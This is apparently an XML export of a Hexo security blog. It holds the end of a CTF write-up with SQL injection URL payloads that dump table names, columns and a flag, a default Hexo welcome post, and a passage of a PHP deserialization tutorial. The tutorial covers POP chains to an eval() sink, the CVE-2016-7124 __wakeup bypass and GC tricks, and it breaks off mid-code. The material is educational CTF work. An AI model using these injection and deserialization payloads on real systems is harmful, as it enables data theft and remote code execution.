class="line">dede_downloads,dede_advancedsearch,dede_myadtype,dede_member_type,dede_uploads,dede_member_tj,dede_mytag,dede_admin,dede_admintype,dede_member_model,dede_area,dede_addonarticle,dede_addoninfos,dede_flinktype,dede_member_person,dede_purview,dede_member_snsmsg,dede_shops_products,dede_member_space,dede_member_group,dede_freelist,dede_addonspec,dede_softconfig,dede_arccache,dede_plus_seoinfo,dede_co_onepage,dede_sys_set,dede_vote_member,dede_member_operation,flag,dede_myad,dede_tagindex,dede_member_feed,dede_addonshop,dede_sys_enum,dede_sysconfig,dede_archives_log_list,dede_dl_log,dede_member_friends,dede_flink,dede_erradd,dede_sys_module,dede_homepageset,dede_member_vhistory,dede_shops_userinfo,dede_feedback,dede_taglist,dede_payment,dede_channeltype,dede_co_urls,dede_co_note,dede_moneycard_record,dede_search_cache,dede_member_pms,dede_member_company,dede_shops_delivery,dede_addonsoft,dede_diyforms,dede_stepselect,dede_co_htmls,dede_member_guestbook,dede_archives_log_detail,dede_addonimages,dede_scores,dede_arctiny,dede_archives,dede_member_flink,dede_member_msg,dede_sys_task,dede_sgpage,dede_pwd_tmp,dede_keywords,dede_moneycard_type,dede_member_stowtype,dede_arcatt,dede_shops_orders,dede_search_keywords,dede_arctype,dede_verifies,dede_log,dede_plus,dede_multiserv_config,dede_arcmulti,dede_member_stow,dede_member,dede_ratings,dede_vote,dede_arcrank,dede_co_mediaurls,dede_mtypes</span><br></pre></td></tr></table></figure><p>有一个<code>flag</code>的表，接下来注<code>flag</code>表</p><p><strong>列名</strong></p><p>跑出<code>flag</code>表的列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10,11%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=&#x27;flag&#x27;--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_value</span><br></pre></td></tr></table></figure><p><strong>数据</strong></p><p>注出<code>flag</code>表中的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,concat(flag_value),3,4,5,6,7,8,9,10,11%20from%20flag--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rwctf&#123;70adbbd8-b9da-11ee-9b1e-00163e01b905&#125;</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_4_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world/"/>
      <url>/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="一些常用的知识"><a href="#一些常用的知识" class="headerlink" title="一些常用的知识"></a>一些常用的知识</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">private变量会被序列化为：/x00类名/x00变量名</span><br><span class="line">protected变量会被序列化为: /x00/*/x00变量名 </span><br><span class="line">public变量会被序列化为：变量名</span><br><span class="line">在PHP中，类不区分大小写</span><br><span class="line"></span><br><span class="line">__sleep()    //在对象被序列化之前运行  *</span><br><span class="line"></span><br><span class="line">__wakeup()   //将在反序列化之后立即调用  *</span><br><span class="line">如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。此特性自 PHP 7.4.0 起可用。</span><br><span class="line">__construct() //当对象被创建时，会触发进行初始化</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__toString()： //当一个对象被当作字符串使用时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="如何找反序列化链"><a href="#如何找反序列化链" class="headerlink" title="如何找反序列化链"></a>如何找反序列化链</h1><p>一般来说，我们都是要通过反序列的链子实现某些操作，比如rce、文件包含、文件写入等等。可以通过从结果（目的、想到实现的操作）开始一直往前推，比较容易找到一条可用的链子。</p><p>简单样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">big</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析：</p><ol><li><p>最终利用的是<code>shen::__toString()</code>来rce，所以我们下一步是找能触发它的地方。</p></li><li><p>在<code>big::__call()</code>的<code>preg_match</code>能触发<code>__toString</code>方法，可以理解为正则匹配是字符串操作，所以可以触发，因此我们用这个来触发<code>shen::__toString()</code>。（注：把一个对象当作字符串处理可以触发<code>__toString</code>方法）</p></li><li><p><code>ctf::__destruct()</code>能触发<code>__call</code>，因此用它来触发<code>big::__call()</code>。（注：调用对象调用不存在的方法时触发<code>__call</code>方法）</p></li><li><p><code>__destruct</code>方法是在对象被销毁时触发，因此只要反序列化代码运行结束就能触发该方法。</p></li><li><p>接下来是变量赋值的细节，首先<code>__call</code>的触发是用的是<code>ctf</code>类的<code>h1</code>变量，<code>h2</code>变量会传递到<code>__call</code>方法的<code>$args</code>变量，因此<code>h1</code>是 <code>new big()</code>，<code>h2</code>是<code>new shen()</code>；<code>shen</code>类的<code>cmd</code>变量是能执行命令的，因此里面是放想要执行的命令。</p></li><li><p>最终的链子是：<code>ctf::__destruct =&gt; big::__call =&gt; shen::__toString </code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">big</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h1 = <span class="keyword">new</span> <span class="title function_ invoke__">big</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h2 = <span class="keyword">new</span> <span class="title function_ invoke__">shen</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:2:&#123;s:2:&quot;h1&quot;;O:3:&quot;big&quot;:0:&#123;&#125;s:2:&quot;h2&quot;;O:4:&quot;shen&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="wakeup-绕过总结"><a href="#wakeup-绕过总结" class="headerlink" title="wakeup()绕过总结"></a>wakeup()绕过总结</h1><h2 id="cve-2016-7124"><a href="#cve-2016-7124" class="headerlink" title="cve-2016-7124"></a>cve-2016-7124</h2><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><p>正常来说在反序列化过程中，会先调用 <code>__wakeup()</code> 方法再进行 <code>unserilize</code> 的操作，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，<code>__wakeup()</code>的执行会被跳过。</p><p>样例（php 5.5.9）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正常反序列化：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?ctf=O:3:&quot;ctf&quot;:2:&#123;s:2:&quot;h1&quot;;N;s:2:&quot;h2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_1_1.png"></p><p>很明显是先触发了<code>wakeup</code>再触发<code>destruct</code>。</p><p>若将<code>&quot;ctf&quot;:2</code>的<code>2</code>改成<code>3</code>，使得对象属性个数变大，则会使<code>wakeup</code>不触发。</p><p>对象属性个数不匹配：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?ctf=O:3:&quot;ctf&quot;:3:&#123;s:2:&quot;h1&quot;;N;s:2:&quot;h2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_1_2.png" alt="wakeup_1_2"></p><h2 id="php引用赋值"><a href="#php引用赋值" class="headerlink" title="php引用赋值 &amp;"></a>php引用赋值 &amp;</h2><p>在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</p><p>举例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a = &#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b = &#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改$b的值也会修改$a的值</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;new test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a = &#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b = &#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_2_1.png"></p><p>这个方法是用来绕过一些特定的判断。</p><p>样例（PHP 7.1.9）:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=False;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;wakeup)||!<span class="variable language_">$this</span>-&gt;wakeup)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You get it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wakeup=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>若将<code>$this-&gt;wakeup</code>和<code>$this-&gt;key</code>引用关联起来，那么在<code>__destruct</code>里对<code>$this-&gt;key</code>修改时也会把<code>$this-&gt;wakeup</code>一起修改了，从而达成if语句的条件。</p><p>这里并没有绕过<code>wakeup</code>，<code>wakeup</code>正常执行了，只不过利用了引用的特点，使得<code>wakeup</code>里执行的操作对我们起不了作用。</p><p>pop：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=False;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;wakeup)||!<span class="variable language_">$this</span>-&gt;wakeup)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You get it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wakeup=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = &amp;<span class="variable">$a</span>-&gt;wakeup;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:2:&#123;s:3:&quot;key&quot;;N;s:6:&quot;wakeup&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_2_2.png"></p><h2 id="PHP-GC回收机制"><a href="#PHP-GC回收机制" class="headerlink" title="PHP GC回收机制"></a>PHP GC回收机制</h2><h3 id="PHP-GC-回收机制是什么"><a href="#PHP-GC-回收机制是什么" class="headerlink" title="PHP GC 回收机制是什么"></a>PHP GC 回收机制是什么</h3><p>​在 PHP 中，是拥有垃圾回收机制 Garbage collection 的，也就是我们常说的 GC 机制的，在 PHP 中使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为 NULL ，或者没有任何指针指向时，它就会被变成垃圾，被 GC 机制自动回收掉；那么当一个对象没有了任何引用之后，就会被回收，在回收过程中，就会自动调用对象中的 <code>__destruct()</code> 方法。</p><ul><li>上面这一段话我个人认为如果零基础看，会感觉到相当抽象。所以我们先来解读一下</li></ul><p><strong>PHP 引用计数</strong></p><p>当我们 PHP 创建一个变量时，这个变量会被存储在一个名为 zval 的变量容器中。在这个 zval 变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。</p><p>第一个字节名为 <code>is_ref</code>，是 bool 值，它用来标识这个变量是否是属于引用集合。PHP 引擎通过这个字节来区分普通变量和引用变量，由于 PHP 允许用户使用 <code>&amp;</code> 来使用自定义引用，zval 变量容器中还有一个内部引用计数机制，来优化内存使用。</p><p>第二个字节是 <code>refcount</code>，它用来表示指向 zval 变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。</p><p>接下来看看例子：</p><p>容器的生成：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里定义了一个变量 <code>$a</code>，生成了类型为 String 和值为 <code>test</code> 的变量容器，而对于两个额外的字节，<code>is_ref</code> 和 <code>refcount</code>，我们这里可以看到是不存在引用的，所以 <code>is_ref</code> 的值应该是 false，而 <code>refcount</code> 是表示变量个数的，那么这里就应该是1，验证一下。</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_1.png"></p><p>接下来添加一个引用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的话 a 的 <code>refcount</code> 应该是 1，<code>is_ref</code> 应该是 true，验证一下</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_2.png"></p><p>结果不同于我们所想的，这是为什么呢？</p><p>因为同一变量容器被变量 a 和变量 b 关联，当没必要时，php 不会去复制已生成的变量容器。 所以这一个 <code>zval</code> 容器存储了 a 和 b 两个变量，就使得 <code>refcount</code> 的值为 2。</p><p>容器的销毁：</p><p>当函数执行结束或者对变量调用了 <code>unset()</code> 函数，refcount 就会减 1。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="variable">$b</span> =&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> =&amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_3.png"></p><h3 id="PHP-GC-回收机制攻击面"><a href="#PHP-GC-回收机制攻击面" class="headerlink" title="PHP GC 回收机制攻击面"></a>PHP GC 回收机制攻击面</h3><ul><li>原理：当 <code>is_ref</code> 减少时，会触发 <code>__destuct</code> 魔术方法，由此产生的一些 trick 类型攻击</li></ul><p>变量被<code>unset</code>函数处理：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;num = <span class="variable">$num</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__destruct()&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">2</span>); </span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">3</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_4.png"></p><p>当对象为<code>NULL</code>时也是可以触发<code>__destruct</code>的。</p><p>在一个 array 里面存在一个键值对，value 为某个类，当这个类为 NULL 的时候，会被认为是 <code>is_ref</code> 为 0，也就是 false。这就可以触发到 <code>__destruct</code> 方法</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ 